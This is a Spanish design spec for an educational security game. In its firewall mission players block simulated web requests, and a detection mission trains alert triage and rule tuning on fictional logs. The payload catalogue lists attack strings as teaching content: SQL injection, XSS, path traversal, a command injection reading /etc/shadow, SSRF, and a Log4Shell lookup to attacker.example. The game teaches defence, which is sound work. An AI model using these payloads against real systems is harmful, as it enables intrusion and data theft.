  | 'log4shell' | 'ssrf' | 'nosqli' | 'proto' | 'jwt-none'

export type PacketOutcome = 'blocked' | 'delivered' | 'breach' | 'false-positive'

export interface Packet {
  readonly id: number
  readonly payloadId: string
  readonly lane: number
  readonly w: number                 // ancho estimado, fracción de pista
  readonly x: number                 // borde delantero, 0..1 (1 = gateway)
  readonly outcome?: PacketOutcome   // definido = resuelto (se queda hasta el fin del fade)
  readonly resolvedAt?: number
}

export interface Measure { charFrac: number; padFrac: number; maxFrac: number }

export interface FirewallConfig {
  lanes: 2 | 3
  integrity: number                  // 5
  waves: number                      // 6
  waveMs: number                     // 20000
  measure: Measure
}

export interface RealtimeState {
  readonly mode: 'realtime'
  readonly config: FirewallConfig
  readonly rng: number
  readonly bags: Readonly<Record<BagKey, readonly string[]>>
  // BagKey = 'threat:1' | 'threat:2' | 'threat:3' | 'legit:simple' | 'legit:tricky'
  readonly status: 'running' | 'paused' | 'ended'
  readonly pauseReason?: 'user' | 'hidden' | 'offscreen' | 'blur'
  readonly outcome?: 'survived' | 'breached'
  readonly elapsed: number
  readonly wave: number
  readonly nextSpawnAt: number
  readonly nextId: number
  readonly packets: readonly Packet[]
  readonly selectedLane: number | null
  readonly integrity: number
  readonly score: number
  readonly log: readonly { payloadId: string; outcome: PacketOutcome }[] // para el debrief
  readonly rev: number
}

export interface UntimedState {
  readonly mode: 'untimed'
  readonly queue: readonly string[]  // 24 payloadIds
  readonly index: number
  readonly decisions: readonly { payloadId: string; verdict: 'allow' | 'block'; correct: boolean }[]
  readonly score: number
  readonly status: 'running' | 'ended'
}

export type FirewallState = RealtimeState | UntimedState
```

### 6.8 Acciones y eventos

```ts
export type FirewallAction =
  | { type: 'tick'; dt: number }
  | { type: 'block'; packetId: number }
  | { type: 'blockLane'; lane: number }
  | { type: 'blockInspected' }
  | { type: 'selectLane'; lane: number | null }
  | { type: 'pause'; reason: 'user' | 'hidden' | 'offscreen' | 'blur' }
  | { type: 'resume' }
  | { type: 'measure'; measure: Measure }
  | { type: 'decide'; verdict: 'allow' | 'block' }          // sin límite de tiempo

export type FirewallEvent =
  | { type: 'spawned'; packetId: number; lane: number }
  | { type: 'blocked'; packetId: number; correct: boolean; points: number }
  | { type: 'delivered'; packetId: number; points: number }
  | { type: 'breach'; packetId: number }
  | { type: 'integrityChanged'; integrity: number; cause: 'breach' | 'false-positive' }
  | { type: 'waveStarted'; wave: number }
  | { type: 'paused'; reason: string }
  | { type: 'resumed' }
  | { type: 'decided'; payloadId: string; correct: boolean; points: number }
  | { type: 'ended'; outcome: 'survived' | 'breached' | 'finished' }
```

### 6.9 Componentes

| Componente | Responsabilidad |
|---|---|
| `FirewallMission` | Briefing → partida → debrief; elige modo; crea el store; entrega `MissionResult` |
| `FirewallHud` | Oleada, barra de progreso de la oleada, puntaje, integridad (texto + `Rack`), botón de pausa |
| `Rack` | SVG con N unidades; las perdidas usan `--threat` y un rayado diagonal (señal sin color) |
| `Board` | Contenedor con `container-type: inline-size`; foco y teclado; pausa automática |
| `Lane` | Número de carril (`<kbd>`), pista y línea del gateway |
| `Packet` | `<button>` con `<code translate="no">`; `transform: translateX(calc(var(--x) * 100cqw - 100%))`; registra su ref |
| `Inspector` | Paquete objetivo en grande, carril y botón "Bloquear" |
| `PauseOverlay` | "En pausa" + motivo + "Continuar" (recibe el foco) |
| `UntimedRound` | Tarjeta de petición, "Permitir" / "Bloquear", panel de feedback, "Siguiente" |
| `FirewallDebrief` | Estadísticas, ataques vistos, legítimos engañosos, tesis, enlaces de salida |

Estados visuales (color + forma + texto, nunca solo color):

| Estado | Tratamiento |
|---|---|
| En vuelo | Neutro: `--ink` sobre `--surface-2`, borde `--line`. **Nunca revela si es amenaza** |
| Carril seleccionado | Borde `--accent` y `aria-pressed` en el botón del carril |
| Amenaza bloqueada | Borde `--threat`, icono de escudo y texto "bloqueada"; desaparece en 400 ms (instantáneo con reduced motion) |
| Falso positivo | Borde `--warn`, texto "falso positivo" |
| Legítimo entregado | Sale por el gateway; marca `--ok` breve en el servidor |
| Brecha | Una unidad del rack pasa a `--threat` con rayado y aparece el texto "brecha". Sin parpadeo ni sacudida |

El DOM de un paquete sin resolver **no contiene** su clasificación (ni clases ni atributos `data-`).

### 6.10 Wireframes

Tiempo real, escritorio:

```text
┌──────────────────────────────────────────────────────────────────────────────┐
│ Misión 01  Firewall                     Datos simulados          [ Salir ]   │
│ Oleada 3 de 6  ▓▓▓▓▓▓░░░░   Puntaje 340   Integridad 4 de 5  ▣▣▣▣▨   [Pausa] │
├──────────────────────────────────────────────────────────────────────┬───────┤
│ 1 │ [GET /search?q=sales script]       [GET /items?order=1;DROP…]   ┃ ┌───┐ │
│ 2 │            [POST /auth/login]                                   ┃ │▤▤▤│ │
│ 3 │ [GET /static/..%2f..%2f.env]                                    ┃ │▤▤▤│ │
│   │                                                          gateway┃ └───┘ │
├──────────────────────────────────────────────────────────────────────┴───────┤
│ Inspector: carril 1, el más cercano al gateway                               │
│   GET /items?order=1;DROP TABLE users                     [ Bloquear ]       │
│ Teclas: 1 2 3 bloquean el primero de cada carril. Flechas eligen carril,     │
│ Espacio bloquea el del inspector. P pausa.                                   │
└──────────────────────────────────────────────────────────────────────────────┘
```

Tiempo real, móvil (contenedor < 560 px, 2 carriles, chips en hasta 2 líneas):

```text
┌───────────────────────────────┐
│ Firewall      Datos simulados │
│ Oleada 3/6  340  Integridad 4/5│
├───────────────────────────────┤
│ 1│[GET /customers?q=          ┃│
│  │ O'Higgins]                 ┃│
│ 2│      [POST /login user=    ┃│
│  │       admin'--]            ┃│
├───────────────────────────────┤
│ Más cercano al gateway:       │
│ POST /login user=admin'--     │
│ [        Bloquear          ]  │
│ [ Pausa ]                     │
└───────────────────────────────┘
```

Sin límite de tiempo:

```text
┌──────────────────────────────────────────────────────────┐
│ Petición 7 de 24                      Puntaje 90         │
│ ┌──────────────────────────────────────────────────────┐ │
│ │ GET /customers?q=O'Higgins                           │ │
│ └──────────────────────────────────────────────────────┘ │
│ [ Permitir ]  [ Bloquear ]                               │
│                                                          │
│ Correcto: permitida.                                     │
│ Un apóstrofo en un apellido es un dato válido. El riesgo │
│ sería concatenarlo dentro de SQL, no recibirlo.          │
│ [ Siguiente ]                                            │
└──────────────────────────────────────────────────────────┘
```

### 6.11 Contenido

Cambios sobre `src/game/payloads.ts` (pasa a `missions/firewall/content/`):

1. `name` y `fix` pasan a `L10n`. Se agregan `id`, `tier`, `why` (por qué es amenaza o por qué es
   legítimo, bilingüe), `danger` (subcadena peligrosa, se marca con `<mark>` en el feedback y el
   debrief) y `ref` (URL de la cheat sheet de OWASP correspondiente, verificada al escribir).
2. Rutas del sistema ficticio en inglés (G11, pregunta Q2): `/clientes` → `/customers`,
   `script de ventas` → `sales script`, etc. El texto de cada payload es un único string.
3. Dominios e IPs reservados: `ldap://x.io/a` → `ldap://attacker.example/a`;
   `ip=1.1.1.1;cat /etc/shadow` → `ip=192.0.2.10;cat /etc/shadow`.
4. `WIRE_LEGIT` y `WIRE_THREATS` se eliminan si se confirma D8 (hero tipográfico): no quedan usos.
5. Se agrega la variante codificada de JWT sin firma (tier 3):
   `Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiIxIn0.` (cabecera `{"alg":"none"}`, firma vacía).

```ts
// missions/firewall/content/types.ts
export interface AttackInfo {
  kind: AttackKind
  name: L10n   // en minúscula salvo siglas: se usa a mitad de frase
  fix: L10n
  ref: string
}

export interface PayloadDef {
  id: string           // estable: 'sqli-or-tautology'
  text: string         // código: no se traduce
  attack?: AttackKind  // ausente = legítimo
  tier: Tier
  why: L10n
  danger?: string      // debe ser subcadena de `text` (lo verifica un test)
}
```

Tiers propuestos para el catálogo actual (en inglés):

| Tier | Amenazas | Legítimos |
|---|---|---|
| 1 | `GET /products?id=1' OR '1'='1`; `GET /items?order=1;DROP TABLE users`; `GET /search?q=<script>alert(1)</script>`; `GET /files?f=../../etc/passwd`; `POST /ping ip=192.0.2.10;cat /etc/shadow` | Los 17 legítimos simples (`GET /health`, `POST /auth/login`, `PATCH /invoices/1043`…) |
| 2 | `POST /login user=admin'--`; `GET /search?q=' UNION SELECT pass--`; `POST /comments <img src=x onerror=…>`; `GET /profile?n=<svg onload=fetch(…)>`; `GET /hello?n={{7*7}}`; `User-Agent: ${jndi:ldap://attacker.example/a}`; `GET /preview?url=http://169.254.169.254`; `POST /login {"pass":{"$ne":null}}`; `POST /profile {"__proto__":{"admin":1}}`; `Authorization: JWT {"alg":"none"}` | `GET /search?q=sales script`; propuesta: `GET /search?q=drop shipping` |
| 3 | `GET /static/..%2f..%2f.env`; `GET /convert?f=a.png|sh`; `GET /template?t={{config.items()}}`; `GET /fetch?u=http://localhost:6379`; JWT codificado | `GET /customers?q=O'Higgins`; propuestas: `GET /files/report..v2.pdf` (dos puntos sin barra no es traversal), `POST /profile {"bio":"I <3 APIs"}` (un `<` en un dato no es XSS; el riesgo está en renderizarlo sin escapar) |

Invariantes de contenido (tests, §15.4): `threat:1`, `threat:2` y `threat:3` con al menos 6
elementos cada una; `legit:simple` con al menos 12; `legit:tricky` con al menos 5. **Hoy faltan una
amenaza de tier 1 (hay 5), una de tier 3 (hay 5 contando el JWT codificado) y tres legítimos
engañosos (hay 2; las tres propuestas de la tabla completan 5)**. El contenido se completa antes de
implementar. Ningún payload puede ser ambiguo: si su `why` no se puede escribir en una frase clara,
no entra.

Ampliaciones opcionales del catálogo (V1.1, cada una requiere su `AttackKind`, `fix` y `ref`): open
redirect (`GET /login?next=//attacker.example`), inyección CRLF, XXE.

### 6.12 Debrief

```text
Sobreviviste a las 6 oleadas.           Puntaje 1.240   Mejor 1.240
Precisión 97 %   Amenazas bloqueadas 32 de 34   Falsos positivos 1   Brechas 2

Lo que viste
  inyección SQL          bloqueadas 6 de 7
    GET /search?q=' UNION SELECT pass--     ← pasó
    Cómo se previene: consultas parametrizadas; el dato nunca se concatena dentro del SQL.
  path traversal         bloqueadas 3 de 3
    ...
Legítimas que parecían amenazas
  GET /customers?q=O'Higgins   la bloqueaste. Un apóstrofo en un apellido es un dato válido...

La idea
  Un filtro en el borde compra tiempo. La corrección vive en el código.
  En las últimas oleadas ya no hay tiempo de leer cada petición: por eso la validación
  no puede depender de alguien mirando tráfico.
  (Técnicamente, aquí hiciste de WAF: un firewall de aplicación web.)

Lo real
  Cómo valido la entrada en mis proyectos (caso de estudio, sección de seguridad)
[ Siguiente: Detección ]  Jugar de nuevo  Volver a Cyber Ops           Partida 3F2A9C
```

- "Lo que viste" agrupa por `AttackKind`, en orden de aparición. Por tipo muestra el conteo, un
  ejemplo (el que pasó, si alguno pasó) con `danger` marcado, y `fix`.
- La línea sobre la sobrecarga solo aparece si el jugador llegó a la oleada 5 o más.
- Copias: ES "Un filtro en el borde compra tiempo. La corrección vive en el código." / EN "A filter
  at the edge buys time. The fix lives in the code."

### 6.13 Accesibilidad específica

- El tablero es un `role="group"` enfocable (`tabindex="0"`) con `aria-label` y `aria-describedby`
  apuntando a las instrucciones visibles. **Los atajos de una tecla solo funcionan con el foco dentro
  del tablero** (WCAG 2.1.4): el handler está en el tablero, no en `window`.
- Teclado: `1`/`2`/`3` bloquean el más adelantado del carril; `↑`/`↓` seleccionan carril;
  `Espacio`/`Enter` bloquean el paquete del inspector; `P` o `Escape` pausan; `Tab` sale del tablero.
  Los paquetes son `<button tabindex="-1">`: se pueden pulsar con ratón o dedo, pero no ensucian el
  orden de tabulación con objetivos en movimiento.
- Lectores de pantalla: el modo en tiempo real no intenta narrar cada paquete. El live region
  (`polite`) anuncia solo el inicio de oleada, los cambios de integridad ("Brecha. Integridad 3 de
  5") y la pausa, con un máximo de un anuncio cada 2 s. El equivalente accesible es el modo sin
  límite de tiempo, que se ofrece de forma explícita en el briefing.
- Sin límite de tiempo: cada decisión es un botón nativo. Tras decidir, el feedback aparece en un
  `role="status"` y el foco pasa a "Siguiente".
- WCAG 2.2.1: modo sin límite de tiempo elegible antes de empezar, más pausa en cualquier momento.
  WCAG 2.2.2: el movimiento empieza solo por acción del usuario, se puede pausar y se pausa solo.
  WCAG 2.3.1: ningún parpadeo.
- Reduced motion: preselecciona el modo sin límite. Si el jugador elige tiempo real, el movimiento
  de los paquetes se mantiene (es esencial para la mecánica) y se quitan los fades y las transiciones.

### 6.14 Definition of Done (Misión 01)

- [ ] Motor con ambos modos, 100 % de ramas cubiertas por tests (§15.1) y deterministas con semilla.
- [ ] Catálogo bilingüe con `tier`, `why`, `danger` y `ref`; invariantes de contenido en verde.
- [ ] Jugable de punta a punta con ratón, táctil y solo teclado; el atajo no actúa fuera del tablero.
- [ ] Pausa manual y automática (pestaña oculta, fuera de vista, `blur`); reanudar solo con acción.
- [ ] 3 carriles a partir de 560 px de contenedor y 2 por debajo; ningún payload se trunca.
- [ ] Debrief con ataques vistos, legítimos engañosos, tesis, enlaces de salida y semilla.
- [ ] Ninguna clasificación en el DOM de un paquete sin resolver.
- [ ] Rendimiento: ≤ 4 ms de trabajo por frame en la oleada 6 con CPU 4× ralentizada (§14).
- [ ] Playtest con al menos 5 personas sin formación en seguridad: la mayoría llega a la oleada 4
      en su primer intento y al menos una completa la misión. Si no, se ajusta la integridad o la
      tabla de §6.5, solo en `params.ts`.
- [ ] Revisión de lector de pantalla (NVDA + Firefox y VoiceOver + Safari) del modo sin límite.
- [ ] César revisó los textos en ES y EN.

---

## 7. Misión 02 · Detección

### 7.1 Base real: qué se toma del Wazuh SOC Lab y qué no

Fuente revisada (solo lectura): `wazuh-soc-lab/README.md`, `detection/`, `simulations/`,
`response/incident-response.md`, `docs/`.

Lo que el laboratorio **sí** documenta y el juego toma como estructura:

| Del laboratorio | Uso en la misión |
|---|---|
| Pipeline agente → manager (decoders, reglas) → alerta → indexer → dashboard → investigación | Marco del briefing: "una regla disparó una alerta; tu trabajo empieza ahí" |
| Distinción explícita entre **evento**, **alerta** e **incidente** | Es la pregunta de clasificación de cada caso |
| Campos de intake: `timestamp`, `agent.name`, `agent.id`, `rule.id`, `rule.level`, `rule.description`, `location` | Columnas y cabecera de la alerta del juego (con valores simulados) |
| "`rule.level` es una señal inicial, no la severidad final" | El caso 1 tiene nivel alto y es benigno |
| Severidad en cuatro niveles: Low (actividad esperada), Medium (sin explicar, sin evidencia de compromiso), High (no autorizada con impacto plausible), Critical (compromiso confirmado) | Escala de severidad del juego, con esas definiciones como ayuda |
| Árbol de decisión: ¿esperado? → documentar y cerrar; si no → investigar → ¿compromiso? → contener, erradicar, recuperar, documentar | Flujo de pasos de cada caso |
| Contención: aislar el endpoint, detener el proceso, deshabilitar la cuenta, bloquear indicadores, preservar evidencia | Catálogo de acciones de respuesta |
| Validación FIM real: `Integrity checksum changed` y `File deleted` en un directorio monitoreado, correlacionados con la ventana de prueba por `timestamp` + `agent.id` + ruta | Caso 1, con la misma estructura y datos ficticios |
| Recolección de eventos de autenticación de Windows (objetivo documentado en `detection/authentication.md`) | Fuente del caso 2 |
| Roadmap: "Authentication attack simulations (brute force, credential stuffing)" y "Detection tuning and false-positive reduction", **no implementados** | El caso 2 y el caso 3 se presentan como lo que son: simulados, y en el roadmap del laboratorio |

Lo que el juego **no** puede decir:

- Que los datos vienen de Wazuh o del laboratorio.
- Que el laboratorio detectó una fuerza bruta: no existe esa simulación.
- IDs de reglas reales de Wazuh: el laboratorio no los registró ("Not captured in this lab run"). El
  juego usa ids propios con prefijo `SIM-`.
- Que César escribió reglas personalizadas de Wazuh: están en el roadmap del laboratorio. Por eso
  el caso 3 usa una **pseudorregla en lenguaje natural**, no XML de Wazuh.
- Sysmon: `architecture/README.md` del laboratorio lo menciona, pero `simulations/` dice que no hay
  monitoreo de procesos. El juego no lo menciona (inconsistencia reportada a 08 y a César, Q9).

Texto puente, visible en el briefing y en el debrief. **Es el texto canónico de 08 §8 y no se
reescribe aquí:**

- ES: "La misión 02 usa registros simulados. No está conectada a Wazuh ni a ningún sistema real.
  Del Wazuh SOC Lab toma el método de investigación, no sus datos."
- EN: "Mission 02 runs on simulated logs. It is not connected to Wazuh or to any live system.
  It takes the Wazuh SOC Lab's investigation method, not its data."

El debrief puede añadir debajo qué validó el lab (FIM de punta a punta) y que la fuerza bruta
todavía no está en el lab, con un enlace al capítulo correspondiente.

### 7.2 Objetivo

- Narrativa: la misma noche, eres el analista de guardia. Llegan alertas.
- Concepto: logs → IOC → fuerza bruta → detección.
- Mensaje: una regla dispara una alerta; la investigación decide si hay un incidente. Y ninguna
  regla lo detecta todo: diseñarla es elegir qué falla aceptas.

### 7.3 Estructura: tres casos

| Caso | Título (ES / EN) | Pasos | Qué enseña | Dificultad |
|---|---|---|---|---|
| 1 | Cambio de integridad / Integrity change | Clasificar + severidad, Responder | Una alerta no es un incidente; correlacionar con actividad autorizada; no sobrerreaccionar | Baja: 3 eventos |
| 2 | Fallos de inicio de sesión / Failed logons | IOCs, Evento clave, Clasificar + severidad, Responder | Pivotar, separar ruido de ataque, el éxito tras los fallos es lo que importa, persistencia y evasión | Media: ~50 eventos con ruido |
| 3 | Ajusta la regla / Tune the rule | Configurar, Probar (varias veces), Guardar | Detection engineering: falsos positivos frente a falsos negativos; una sola regla no cubre todo | Abierta: no hay configuración perfecta |

Todo por turnos. Sin reloj. Cada caso se envía como un informe ("Enviar informe") y después se ve
la corrección paso a paso.

### 7.4 Caso 1: cambio de integridad

Alerta (simulada): `SIM-FIM-01`, nivel 7, `ws-lab-01`, "Integrity checksum changed".

```text
id     time (UTC)  host       source  message
c1-01  10:02:11    ws-lab-01  fim     Integrity checksum changed: C:\Monitored\notes.txt (sha256 changed)
c1-02  10:02:40    ws-lab-01  fim     Integrity checksum changed: C:\Monitored\notes.txt (sha256 changed)
c1-03  10:05:03    ws-lab-01  fim     File deleted: C:\Monitored\notes.txt
```

Contexto (panel lateral): "Registro de cambios CHG-0142: prueba de FIM autorizada en `ws-lab-01`,
directorio `C:\Monitored`, de 10:00 a 10:15 UTC. Responsable: equipo de seguridad (tú)."

| Paso | Respuesta correcta | Notas |
|---|---|---|
| Clasificación | Alerta esperada | Coincide con la ventana autorizada |
| Severidad | Baja (Media = parcial) | El nivel 7 de la regla no decide la severidad |
| Respuesta | Documentar y cerrar | Aislar el endpoint o reiniciarlo es dañino: tumba un equipo por una prueba propia |

Debrief: "Si el borrado hubiese ocurrido a las 10:41, fuera de la ventana, la respuesta cambiaría.
La pregunta no es si hubo una alerta, sino si la actividad era esperada." Enlace a la validación FIM
real del Security Lab.

Nombres: `ws-lab-01` y `C:\Monitored` son ficticios a propósito. Usar los nombres reales del laboratorio
como homenaje explícito es la pregunta Q3 (el nombre real del equipo nunca se publica).

### 7.5 Caso 2: fallos de inicio de sesión

Alerta (simulada): `SIM-AUTH-01`, nivel 10, `srv-app-01`, "Multiple failed logons from the same
source".

Línea de tiempo (en inglés, como los logs reales). Ventana 01:55–02:20 UTC:

```text
id   time      host        event  account        source_ip     detail
l01  01:58:12  srv-app-01  4624   svc_backup     10.0.1.20     logon_type=3
l02  02:03:40  srv-app-01  4625   mlopez         10.0.2.33     logon_type=3 sub_status=0xC000006A
l03  02:03:52  srv-app-01  4625   mlopez         10.0.2.33     logon_type=3 sub_status=0xC000006A
l04  02:04:05  srv-app-01  4624   mlopez         10.0.2.33     logon_type=3
l05  02:12:31  srv-app-01  4625   admin          203.0.113.45  logon_type=3 sub_status=0xC0000064
l06  02:12:33  srv-app-01  4625   test           203.0.113.45  logon_type=3 sub_status=0xC0000064
l07  02:12:36  srv-app-01  4625   oracle         203.0.113.45  logon_type=3 sub_status=0xC0000064
l08…l45  02:12:40–02:14:52, cada ~3.5 s:
           srv-app-01  4625   administrator  203.0.113.45  logon_type=3 sub_status=0xC000006A
l46  02:14:55  srv-app-01  4624   administrator  203.0.113.45  logon_type=3
l47  02:16:10  srv-app-01  4720   support_tmp    -             created_by=administrator
l48  02:16:12  srv-app-01  4732   support_tmp    -             group=Administrators
l49  02:17:30  srv-app-01  agent  -              -             monitoring agent stopped
```

- `l08…l45` se escribe en el contenido como una plantilla (`repeat({ from, everySec, count, line })`)
  que una función pura expande. Así el dato sigue siendo legible y revisable.
- Contexto: "mlopez está de guardia esta semana." "srv-app-01 no debería recibir inicios de sesión
  desde Internet."
- Herramientas de la vista: filtrar por origen, cuenta y evento; "Agrupar por origen" muestra una
  tabla de conteos (`203.0.113.45`: 41 fallos, 1 éxito; `10.0.2.33`: 2 fallos, 1 éxito). Pivotar es
  la habilidad que se enseña, y esta vista es el momento en que se entiende el caso.

| Paso | Pregunta | Respuesta correcta | Distractores |
|---|---|---|---|
| IOCs | Marca los indicadores de compromiso | `203.0.113.45`, `administrator`, `support_tmp` | `10.0.2.33`, `mlopez`, `svc_backup`, `srv-app-01` (es el activo afectado, no un indicador) |
| Evento clave | ¿Cuál es el **primer** evento que confirma el compromiso? | `l46` (inicio de sesión exitoso tras los fallos) | `l47` (parcial: confirma, pero no es el primero); cualquier `4625` (es un intento, no un compromiso) |
| Clasificación | Alerta esperada / Alerta sin explicar / Incidente | Incidente | |
| Severidad | Baja / Media / Alta / Crítica | Crítica (Alta = parcial) | |
| Respuesta | Selección múltiple | Bloquear el origen, contener cuentas (deshabilitar `support_tmp` y restablecer `administrator`), aislar el endpoint, preservar evidencia | Dañinas: reiniciar el servidor (destruye evidencia volátil), documentar y cerrar. Neutra: monitorear |

Debrief: explica el patrón (enumeración de usuarios con `0xC0000064`, adivinación con
`0xC000006A`, éxito, persistencia con una cuenta nueva en Administrators, evasión al detener el
agente). Incluye: "Después de 02:17:30 no hay más eventos. No porque no pase nada, sino porque el
agente dejó de reportar. El silencio también es una señal." Mapeo a MITRE ATT&CK como "Más
información": T1110.001 (Password Guessing), T1078 (Valid Accounts), T1136.001 (Create Account:
Local Account), T1098 (Account Manipulation), T1562.001 (Impair Defenses: Disable or Modify Tools).

Datos de Windows a verificar contra la documentación de Microsoft al escribir el contenido: 4624
(inicio exitoso), 4625 (inicio fallido), 4720 (cuenta creada), 4732 (miembro agregado a un grupo
local con seguridad habilitada), `logon_type=3` (red), sub-status `0xC000006A` (contraseña
incorrecta) y `0xC0000064` (el usuario no existe). Los IDs de ATT&CK se verifican en
attack.mitre.org.

### 7.6 Caso 3: ajusta la regla

Narrativa: "La regla que te despertó a las 2 a. m. también se dispara por usuarios con la contraseña
vieja guardada en el móvil. Ajústala."

```text
┌────────────────────────────────────────────────────────────────────┐
│ Regla SIM-AUTH-01 (pseudorregla)                                   │
│ Alertar cuando haya al menos [ 5 ▾] fallos en [ 10 min ▾]          │
│ agrupados por ( ) origen  ( ) cuenta                               │
│ [ ] Ignorar orígenes internos (10.0.0.0/8)                         │
│ [ Probar contra 24 h de datos simulados ]                          │
├────────────────────────────────────────────────────────────────────┤
│ Resultado (simulado)                                               │
│ Alertas por actividad normal en 24 h      7   Ver cuáles           │
│ Fuerza bruta rápida                       Detectada                │
│ Password spraying desde la red interna    Detectada                │
│ Ataque lento desde varias IPs             No detectado             │
│ [ Probar otra ]  [ Guardar esta regla ]                            │
└────────────────────────────────────────────────────────────────────┘
```

Controles: `N ∈ {3, 5, 10, 20}`, `T ∈ {1, 10, 60}` min, `groupBy ∈ {source, account}`,
`excludeInternal ∈ {false, true}`: 48 configuraciones. Probar es gratis e ilimitado; solo se
puntúa la regla guardada. Iterar contra datos es la habilidad que se enseña.

Dataset (24 h simuladas, generado por `authDataset(seed)` con una semilla **fija en el contenido**,
no por partida, para que la evaluación sea estable):

| Serie | Patrón | Etiqueta |
|---|---|---|
| Errores de tipeo | ~60 usuarios, 0–4 fallos al día en horario laboral, ráfagas de 1–3 en 2 min | benigno |
| Dispositivo con contraseña vieja | `jperez` desde `10.0.3.15`, 1 fallo cada 5 min de 07:00 a 09:00 | benigno |
| Cuenta de servicio con contraseña vencida | `svc_report` desde `10.0.1.40`, 1 fallo cada 15 min todo el día | benigno |
| Fuerza bruta rápida | `203.0.113.45` → `administrator`, ~40 fallos en ~2 min (el del caso 2) | ataque A |
| Password spraying | `10.0.1.10` (el `srv-app-01` comprometido) → 25 cuentas, 1 fallo cada una en 5 min | ataque B |
| Ataque lento | `198.51.100.7/.8/.9` rotando → `administrator`, 1 fallo cada 6 min durante 3 h | ataque C |

Evaluación (`evaluateRule(config, dataset)`, pura): ventana deslizante por clave de agrupación;
alerta cuando el conteo llega a `N`; tras una alerta, esa clave se suprime durante `T`. Cada alerta
toma la etiqueta del evento que la disparó. Un ataque se detecta si al menos una alerta lleva su
etiqueta.

Puntaje: 25 por cada ataque detectado (máx. 75) + fatiga según alertas benignas al día: ≤ 5 → +25;
≤ 20 → +10; ≤ 50 → −10; > 50 → −30. Mínimo 0.

**Invariantes de diseño** (las hace cumplir un test de golden sobre las 48 configuraciones; el
dataset se ajusta hasta que pasen):

1. Ninguna configuración supera 85 puntos.
2. Al menos 3 configuraciones logran ≥ 70, con trade-offs distintos (por ejemplo, por origen,
   N = 10, T = 10 min detecta A y B y pierde C; por cuenta, N = 10, T = 60 min detecta A y C y pierde B).
3. Detectar los tres ataques implica más de 20 alertas benignas al día.
4. `excludeInternal = true` nunca detecta el ataque B (el precio de ignorar la red interna).
5. La configuración "obvia" (N = 5, T = 1 min, por cuenta) obtiene ≤ 50.

Debrief: "En la práctica se combinan varias reglas, por origen y por cuenta, y se correlacionan.
Una sola regla siempre deja algo fuera. Diseñarla es decidir qué falla aceptas y cuánto ruido
toleras." Enlace al roadmap del laboratorio en el Security Lab ("ajuste de detecciones: pendiente"),
sin presentarlo como hecho.

### 7.7 Flujo de pasos

```text
case.start → [paso 1 … paso n] (navegación libre entre pasos, respuestas editables)
           → Enviar informe (habilitado cuando todos los pasos tienen respuesta)
           → reviewed: corrección por paso + explicación + "Siguiente caso"
```

- Cada paso tiene una "Pista" opcional (`<details>`), que resta 5 puntos la primera vez que se abre.
- La línea de tiempo y el contexto están disponibles en todos los pasos.
- Completar la misión = enviar los tres casos, con cualquier puntaje.

### 7.8 Puntaje

| Caso | Distribución (máx. 100) |
|---|---|
| 1 | Clasificación 40; severidad 20 (parcial 10); respuesta 40 (todas las requeridas y ninguna dañina; −15 por cada dañina) |
| 2 | IOCs 20 (`20 × aciertos/requeridos − 5 × distractores`); evento clave 20 (`l47`: 10); clasificación 20; severidad 10 (parcial 5); respuesta 30 (`30 × requeridas elegidas/requeridas − 10 × dañinas`) |
| 3 | §7.6 |

Cada componente tiene un mínimo de 0. Pistas: −5 cada una. Total máximo de la misión: 300.

### 7.9 Modelo de estado

```ts
// missions/detection/types.ts
export type DetectionCaseId = 'fim-window' | 'auth-burst' | 'rule-tuning'
// Etiquetas: "Alerta esperada (actividad autorizada)", "Alerta sin explicar (sin evidencia de
// compromiso)", "Incidente (evidencia de compromiso)". Siguen el árbol de decisión del laboratorio.
export type Classification = 'expected' | 'unexplained' | 'incident'
export type Severity = 'low' | 'medium' | 'high' | 'critical'
export type ResponseAction =
  | 'document-close' | 'monitor' | 'block-source' | 'contain-accounts'
  | 'isolate-endpoint' | 'preserve-evidence' | 'reboot-endpoint'
export type InvestigationStep = 'iocs' | 'key-event' | 'classify' | 'respond'

export interface LogLine {
  id: string
  t: string                   // ISO UTC simulado
  host: string
  source: 'auth' | 'fim' | 'agent'
  eventId?: number
  account?: string
  srcIp?: string
  detail: string              // texto de log en inglés; no se traduce
}

export interface Entity { id: string; kind: 'ip' | 'account' | 'host' | 'path'; value: string }

export interface InvestigationCase {
  id: Exclude<DetectionCaseId, 'rule-tuning'>
  title: L10n
  alert: { ruleId: string; level: number; host: string; t: string; description: string }
  context: readonly L10n[]
  timeline: readonly LogLine[]
  entities: readonly Entity[]
  steps: readonly InvestigationStep[]
  rubric: {
    classification: Classification
    severity: { correct: Severity; partial?: readonly Severity[] }
    iocs?: { required: readonly string[]; distractors: readonly string[] }
    keyEvent?: { correct: string; partial?: readonly string[] }
    response: {
      required: readonly ResponseAction[]
      harmful: readonly ResponseAction[]
    }
  }
  hints: Partial<Record<InvestigationStep, L10n>>
  explanations: Record<InvestigationStep, L10n>
  debrief: L10n
}

export interface CaseAnswers {
  iocs: readonly string[]
  keyEvent?: string
  classification?: Classification
  severity?: Severity
  response: readonly ResponseAction[]
  hintsOpened: readonly InvestigationStep[]
}

export interface RuleConfig {
  threshold: 3 | 5 | 10 | 20
  windowMin: 1 | 10 | 60
  groupBy: 'source' | 'account'
  excludeInternal: boolean
}

export interface RuleEvaluation {
  benignAlertsPerDay: number
  detected: Readonly<Record<'fast' | 'spray' | 'slow', boolean>>
  alerts: readonly { key: string; t: string; label: string }[]
  score: number
}

export interface DetectionState {
  readonly caseIndex: 0 | 1 | 2
  readonly answers: Readonly<Record<Exclude<DetectionCaseId, 'rule-tuning'>, CaseAnswers>>
  readonly phase: 'investigating' | 'reviewed'
  readonly rule: { draft: RuleConfig; tests: readonly RuleEvaluation[]; saved?: RuleConfig }
  readonly results: Partial<Record<DetectionCaseId, { score: number; max: number }>>
  readonly status: 'running' | 'ended'
}

export type DetectionAction =
  | { type: 'answer'; patch: Partial<CaseAnswers> }
  | { type: 'openHint'; step: InvestigationStep }
  | { type: 'submitCase' }
  | { type: 'nextCase' }
  | { type: 'setRule'; patch: Partial<RuleConfig> }
  | { type: 'testRule' }
  | { type: 'saveRule' }

export type DetectionEvent =
  | { type: 'hintOpened'; caseId: DetectionCaseId; step: InvestigationStep }
  | { type: 'caseReviewed'; caseId: DetectionCaseId; score: number; max: number }
  | { type: 'ruleTested'; evaluation: RuleEvaluation }
  | { type: 'ended'; score: number }
```

Funciones puras auxiliares (testeables sin React): `scoreCase(case, answers)`,
`filterTimeline(lines, filter)`, `groupTimeline(lines, by)`, `expandRepeat(spec)`,
`authDataset(seed)` y `evaluateRule(config, dataset)`.

### 7.10 Componentes

